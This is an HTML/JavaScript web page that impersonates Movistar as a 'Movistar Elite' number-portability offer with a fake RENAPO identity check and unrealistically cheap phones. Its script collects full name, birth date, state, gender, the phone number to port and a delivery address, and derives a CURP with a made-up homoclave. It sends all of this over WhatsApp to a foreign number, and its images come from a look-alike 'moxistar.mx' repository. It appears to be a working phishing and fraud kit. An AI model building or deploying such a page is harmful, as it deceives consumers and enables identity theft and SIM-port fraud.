<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Movistar Elite | Registro Nacional de Portabilidad</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        movistar: { blue: '#019DF0', dark: '#005A87', green: '#5BC500', slate: '#0f172a' }
                    }
                }
            }
        }
    </script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #f8fafc; }
        .stage { display: none; }
        .stage.active { display: block; animation: fadeIn 0.5s ease; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        input, select { border: 2px solid #e2e8f0 !important; transition: all 0.3s; }
        input:focus, select:focus { border-color: #019DF0 !important; box-shadow: 0 0 0 4px rgba(1, 157, 240, 0.1) !important; outline: none; }
    </style>
</head>
<body class="antialiased">

    <header class="bg-white/80 backdrop-blur-md sticky top-0 z-50 border-b border-slate-100">
        <div class="container mx-auto px-6 py-4 flex justify-between items-center">
            <div class="flex items-center gap-2">
                <div class="w-9 h-9 bg-movistar-blue rounded-xl flex items-center justify-center shadow-lg shadow-blue-200">
                    <i class="fas fa-id-card text-white text-sm"></i>
                </div>
                <span class="font-black text-xl tracking-tighter italic uppercase text-slate-800">Movistar <span class="text-movistar-blue">Elite</span></span>
            </div>
            <div class="hidden md:block text-[10px] font-black text-slate-400 tracking-widest uppercase">Validación de Identidad RENAPO 2026</div>
        </div>
    </header>

    <main class="max-w-7xl mx-auto py-8 px-4">
        
        <section id="stage-1" class="stage active">
            <div class="max-w-2xl mx-auto bg-white rounded-[2.5rem] p-8 md:p-12 shadow-2xl shadow-slate-200">
                <div class="text-center mb-10">
                    <span class="bg-blue-50 text-movistar-blue text-[10px] font-black px-4 py-2 rounded-full uppercase tracking-[0.2em]">Paso 1: Identificación Civil</span>
                    <h2 class="text-3xl font-extrabold text-slate-900 mt-4">Valida tu Beneficio</h2>
                    <p class="text-slate-500 font-medium">Calcularemos tu CURP automáticamente para verificar tu elegibilidad.</p>
                </div>

                <form id="form-identity" class="grid grid-cols-1 md:grid-cols-2 gap-5">
                    <div class="md:col-span-2">
                        <label class="text-[10px] font-black text-slate-400 uppercase tracking-widest ml-1">Nombre(s)</label>
                        <input type="text" id="p-nombre" required class="w-full p-4 rounded-xl font-bold uppercase" placeholder="Ej. JUAN CARLOS">
                    </div>
                    <div>
                        <label class="text-[10px] font-black text-slate-400 uppercase tracking-widest ml-1">Apellido Paterno</label>
                        <input type="text" id="p-paterno" required class="w-full p-4 rounded-xl font-bold uppercase" placeholder="PATERNO">
                    </div>
                    <div>
                        <label class="text-[10px] font-black text-slate-400 uppercase tracking-widest ml-1">Apellido Materno</label>
                        <input type="text" id="p-materno" required class="w-full p-4 rounded-xl font-bold uppercase" placeholder="MATERNO">
                    </div>
                    <div>
                        <label class="text-[10px] font-black text-slate-400 uppercase tracking-widest ml-1">Fecha de Nacimiento</label>
                        <input type="date" id="p-fecha" required class="w-full p-4 rounded-xl font-bold">
                    </div>
                    <div>
                        <label class="text-[10px] font-black text-slate-400 uppercase tracking-widest ml-1">Estado de Nacimiento</label>
                        <select id="p-estado" required class="w-full p-4 rounded-xl font-bold">
                            <option value="">SELECCIONAR...</option>
                            <option value="AS">AGUASCALIENTES</option><option value="BC">BAJA CALIFORNIA</option>
                            <option value="BS">BAJA CALIFORNIA SUR</option><option value="CC">CAMPECHE</option>
                            <option value="CL">COAHUILA</option><option value="CM">COLIMA</option>
                            <option value="CS">CHIAPAS</option><option value="CH">CHIHUAHUA</option>
                            <option value="DF">CIUDAD DE MÉXICO</option><option value="DG">DURANGO</option>
                            <option value="GT">GUANAJUATO</option><option value="GR">GUERRERO</option>
                            <option value="HG">HIDALGO</option><option value="JC">JALISCO</option>
                            <option value="MC">MÉXICO</option><option value="MN">MICHOACÁN</option>
                            <option value="MS">MORELOS</option><option value="NT">NAYARIT</option>
                            <option value="NL">NUEVO LEÓN</option><option value="OC">OAXACA</option>
                            <option value="PL">PUEBLA</option><option value="QT">QUERÉTARO</option>
                            <option value="QR">QUINTANA ROO</option><option value="SP">SAN LUIS POTOSÍ</option>
                            <option value="SL">SINALOA</option><option value="SR">SONORA</option>
                            <option value="TC">TABASCO</option><option value="TS">TAMAULIPAS</option>
                            <option value="TL">TLAXCALA</option><option value="VZ">VERACRUZ</option>
                            <option value="YN">YUCATÁN</option><option value="ZS">ZACATECAS</option>
                            <option value="NE">NACIDO EN EL EXTRANJERO</option>
                        </select>
                    </div>
                    <div class="md:col-span-2">
                        <label class="text-[10px] font-black text-slate-400 uppercase tracking-widest ml-1">Género</label>
                        <div class="flex gap-4 mt-2">
                            <label class="flex-1 border p-4 rounded-xl cursor-pointer hover:bg-slate-50 flex items-center gap-2">
                                <input type="radio" name="genero" value="H" required> <span class="font-bold">HOMBRE</span>
                            </label>
                            <label class="flex-1 border p-4 rounded-xl cursor-pointer hover:bg-slate-50 flex items-center gap-2">
                                <input type="radio" name="genero" value="M" required> <span class="font-bold">MUJER</span>
                            </label>
                        </div>
                    </div>
                    <button type="submit" class="md:col-span-2 bg-movistar-blue text-white py-5 rounded-2xl font-black text-lg shadow-xl shadow-blue-500/20 hover:scale-[1.02] transition-transform">
                        CALCULAR CURP Y CONTINUAR
                    </button>
                </form>
            </div>
        </section>

        <section id="stage-2" class="stage">
            <div class="mb-10 text-center">
                <h3 class="text-2xl font-black text-slate-800 italic uppercase">Equipos Disponibles para tu CURP</h3>
                <div id="curp-display" class="inline-block bg-movistar-blue/10 text-movistar-blue font-mono px-4 py-2 rounded-lg mt-2 font-bold tracking-widest border border-movistar-blue/20"></div>
            </div>
            <div id="grid" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6"></div>
        </section>

        <section id="stage-3" class="stage max-w-5xl mx-auto">
            <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
                <div class="bg-white rounded-[2rem] p-8 shadow-xl">
                    <img id="res-img" src="" class="h-64 mx-auto object-contain mb-6 drop-shadow-2xl">
                    <h4 id="res-name" class="text-2xl font-black text-slate-900 uppercase italic"></h4>
                    <p id="res-total" class="text-3xl font-black text-movistar-blue mt-4"></p>
                </div>
                <div class="bg-slate-900 rounded-[2rem] p-8 text-white">
                    <h5 class="text-sm font-black text-slate-400 uppercase tracking-widest mb-6">Confirmar Portabilidad</h5>
                    <form id="form-final" class="space-y-4">
                        <input type="tel" id="port-num" required placeholder="Número a Portar (10 dígitos)" class="w-full p-4 rounded-xl bg-slate-800 border-none text-white font-bold" maxlength="10">
                        <select id="term" class="w-full p-4 rounded-xl bg-slate-800 border-none text-white font-bold" onchange="App.updatePrice()">
                            <option value="1">PAGO DE CONTADO</option>
                            <option value="6">6 MESES SIN INTERESES</option>
                            <option value="12">12 MESES SIN INTERESES</option>
                            <option value="24">24 MESES SIN INTERESES</option>
                        </select>
                        <textarea id="address" required placeholder="Dirección Completa de Entrega..." class="w-full p-4 rounded-xl bg-slate-800 border-none text-white font-bold resize-none" rows="3"></textarea>
                        <button type="submit" class="w-full bg-movistar-green py-5 rounded-xl font-black uppercase italic tracking-widest hover:bg-green-600 transition-colors">
                            ENVIAR PEDIDO VÍA WHATSAPP <i class="fab fa-whatsapp ml-2"></i>
                        </button>
                    </form>
                </div>
            </div>
        </section>

    </main>

    <script>
        const WHATSAPP_NUM = "584124676073";
        const fmt = new Intl.NumberFormat('es-MX', { style: 'currency', currency: 'MXN' });
        const up = (p) => Math.round(p * 1.15);

        const database = [
            { id: 101, name: "Nubia Neo 3 GT 5G", brand: "ZTE", price: up(1899), img: "https://placehold.co/600x600/0f172a/019DF0/png?text=Nubia+Neo+3+GT" },
            { id: 1, name: "iPhone 17 Pro Max", brand: "Apple", price: up(5499), img: "https://raw.githubusercontent.com/kaddexomg/moxistar.mx/refs/heads/main/IPHONE/iPhone%2017%20Pro%20Max.jfif" },
            { id: 2, name: "Galaxy S24 Ultra", brand: "Samsung", price: up(4999), img: "https://raw.githubusercontent.com/kaddexomg/moxistar.mx/refs/heads/main/SAMGMUG/s%2024%20ultra.jfif" },
            { id: 7, name: "Xiaomi 13T Pro", brand: "Xiaomi", price: up(2899), img: "https://raw.githubusercontent.com/kaddexomg/moxistar.mx/refs/heads/main/XIAOMI/Xiaomi%2013T%20Pro.jfif" },
            { id: 8, name: "Motorola Edge 40 Pro", brand: "Motorola", price: up(2599), img: "https://raw.githubusercontent.com/kaddexomg/moxistar.mx/refs/heads/main/MOTOROLA/Edge%2040%20Pro.jfif" }
        ];

        const App = {
            state: { curp: '', device: null, userData: {} },

            init() {
                document.getElementById('form-identity').onsubmit = (e) => {
                    e.preventDefault();
                    this.calculateCURP();
                };
                document.getElementById('form-final').onsubmit = this.sendWhatsapp.bind(this);
                this.render();
            },

            calculateCURP() {
                const nombre = document.getElementById('p-nombre').value.toUpperCase().trim();
                const paterno = document.getElementById('p-paterno').value.toUpperCase().trim();
                const materno = document.getElementById('p-materno').value.toUpperCase().trim();
                const fecha = document.getElementById('p-fecha').value; // YYYY-MM-DD
                const estado = document.getElementById('p-estado').value;
                const genero = document.querySelector('input[name="genero"]:checked').value;

                // Lógica de extracción (Simplificada según Norma Oficial)
                const getVocal = (s) => s.substring(1).match(/[AEIOU]/)?.[0] || 'X';
                const getConsonante = (s) => s.substring(1).match(/[BCDFGHJKLMNPQRSTVWXYZ]/)?.[0] || 'X';

                let curp = paterno[0] + getVocal(paterno) + materno[0] + nombre[0];
                curp += fecha.substring(2, 4) + fecha.substring(5, 7) + fecha.substring(8, 10);
                curp += genero + estado;
                curp += getConsonante(paterno) + getConsonante(materno) + getConsonante(nombre);
                
                // Homoclave simulada profesional
                curp += "A" + Math.floor(Math.random() * 9); 

                this.state.curp = curp;
                this.state.userData = { nombre, paterno, materno, curp };
                
                document.getElementById('curp-display').innerText = `CURP: ${curp}`;
                this.showStage(2);
            },

            showStage(n) {
                document.querySelectorAll('.stage').forEach(s => s.classList.remove('active'));
                document.getElementById(`stage-${n}`).classList.add('active');
                window.scrollTo({top: 0, behavior: 'smooth'});
            },

            render() {
                const grid = document.getElementById('grid');
                grid.innerHTML = database.map(d => `
                    <div onclick="App.select(${d.id})" class="bg-white p-6 rounded-[2rem] shadow-lg cursor-pointer hover:border-movistar-blue border-2 border-transparent transition-all group">
                        <img src="${d.img}" class="h-40 mx-auto object-contain mb-4 group-hover:scale-105 transition-transform">
                        <h4 class="font-black text-slate-800 text-sm italic uppercase">${d.name}</h4>
                        <p class="text-xl font-black text-movistar-blue mt-2">${fmt.format(d.price)}</p>
                    </div>
                `).join('');
            },

            select(id) {
                this.state.device = database.find(d => d.id === id);
                document.getElementById('res-img').src = this.state.device.img;
                document.getElementById('res-name').innerText = this.state.device.name;
                this.updatePrice();
                this.showStage(3);
            },

            updatePrice() {
                const total = this.state.device.price + up(100);
                document.getElementById('res-total').innerText = fmt.format(total);
            },

            sendWhatsapp(e) {
                e.preventDefault();
                const d = this.state.device;
                const user = this.state.userData;
                const port = document.getElementById('port-num').value;
                const term = document.getElementById('term').value;
                const addr = document.getElementById('address').value;

                const msg = `*REGISTRO PORTABILIDAD ELITE*%0A` +
                            `*CURP:* ${user.curp}%0A` +
                            `*Nombre:* ${user.nombre} ${user.paterno} ${user.materno}%0A` +
                            `--------------------------------%0A` +
                            `*Equipo:* ${d.name}%0A` +
                            `*Número Portar:* ${port}%0A` +
                            `*Financiamiento:* ${term} meses%0A` +
                            `*Dirección:* ${addr}%0A` +
                            `--------------------------------%0A` +
                            `_Validación Automática RENAPO Exitosa_`;

                window.open(`https://api.whatsapp.com/send?phone=${WHATSAPP_NUM}&text=${msg}`, '_blank');
            }
        };

        document.addEventListener('DOMContentLoaded', () => App.init());
    </script>
</body>
</html>
